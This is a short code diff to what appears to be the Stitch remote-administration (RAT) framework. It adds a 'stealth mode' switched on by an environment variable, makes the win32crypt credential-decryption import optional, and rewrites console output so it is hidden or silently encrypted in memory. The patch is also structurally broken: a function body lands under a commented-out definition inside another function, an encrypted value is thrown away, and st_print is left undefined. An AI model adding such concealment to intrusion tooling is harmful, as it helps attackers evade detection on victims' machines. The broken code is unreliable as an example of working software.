@@ -37,10 +37,16 @@ from .Stitch_Vars.globals import *
 from .Stitch_Vars.st_aes import *
 from colorama import Fore, Back, Style, init, deinit, reinit
 
+# Global stealth mode flag
+STEALTH_MODE = os.environ.get('ELITE_STEALTH', 'false').lower() == 'true'
+
 if sys.platform.startswith('win'):
     init()
     import readline
-    import win32crypt
+    try:
+        import win32crypt
+    except ImportError:
+        pass
     p_bar = "="
     temp = 'C:\\Windows\\Temp\\'
     readline.parse_and_bind("tab: complete")
@@ -216,6 +222,25 @@ def linux_client(system = sys.platform):
         return False
 
     # def st_print(text):
+    """Stealth-aware print function"""
+    if not STEALTH_MODE:
+        # Normal operation - print to console
+        print(text)
+    else:
+        # Stealth mode - log to encrypted buffer instead
+        try:
+            # Store in memory-protected buffer
+            if 'memory_protection' in globals():
+                encrypted = memory_protection.encrypt_strings(str(text))
+                # Store for later retrieval
+            else:
+                # Silent operation
+                pass
+        except:
+            pass
+    
+# Alias for backward compatibility
+def st_print_original(text):
     if text.startswith('[+]'):
         text = '\n{}'.format(text)
         print_green(text)
